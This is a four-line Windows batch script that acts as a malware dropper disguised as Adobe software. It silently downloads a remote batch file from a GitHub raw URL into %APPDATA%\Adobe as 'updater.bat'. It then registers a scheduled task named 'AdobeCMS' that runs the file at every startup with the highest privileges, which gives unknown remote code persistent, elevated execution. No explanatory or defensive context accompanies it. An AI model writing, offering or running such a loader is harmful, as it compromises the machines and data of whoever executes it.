@echo off
mkdir -p %APPDATA%\Adobe
curl -s https://raw.githubusercontent.com/qufyu/0024/main/main.bat > %APPDATA%\Adobe\updater.bat
schtasks /create /sc onstart /tn AdobeCMS /tr %APPDATA%\Adobe\updater.bat /f /rl HIGHEST
